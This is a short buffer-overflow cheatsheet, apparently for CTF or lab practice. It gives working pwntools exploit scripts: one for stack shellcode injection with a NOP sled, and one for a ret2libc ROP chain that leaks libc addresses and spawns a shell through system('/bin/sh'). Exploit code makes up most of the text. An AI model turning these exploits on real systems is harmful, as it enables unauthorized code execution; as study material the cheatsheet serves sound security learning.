---
title: Buffer Overflow
description: Buffer Overflow cheatsheet
date: 1970-01-23
categories: [Cheatsheets]
tags: [cheatsheets,buffer-overflow]
---

- [pwntools](https://docs.pwntools.com/en/stable/)
- check protections: `checksec <binary>`
- ASLR: `cat /proc/sys/kernel/randomize_va_space`

## Stack Shellcode

NX Stack, ASLR and Stack Canaries should be disabled

Detect the offset:
```console
cyclic 100 > pattern
gdb pwn
> r < pattern # copy value of the EIP register
```

Run the exploit:
```python
#!/usr/bin/env python2

from pwn import *

context.update(arch="i386", os="linux")

shellcode = shellcraft.sh()

payload  = cyclic(cyclic_find(0x61616167)) # EIP value
payload += p32(0xdeadbeef) # or p32(0xffffd510+200) = ESP address + offset
payload += "\x90" * 100
payload += asm(shellcode)

p = process("./pwn")
p.recvline()
p.sendline(payload)
p.interactive()
```

## Ret2Libc

- get address of system function and of the string `/bin/sh`
- libc binary: `ldd <binary>`

```python
from pwn import *

context.binary = binary = './exploit_me'

elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

offset = 18
padding = b'A'*offset
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

p.recvline()
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.recvline()

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
p.sendline(payload)
p.recvline()
p.interactive()
```
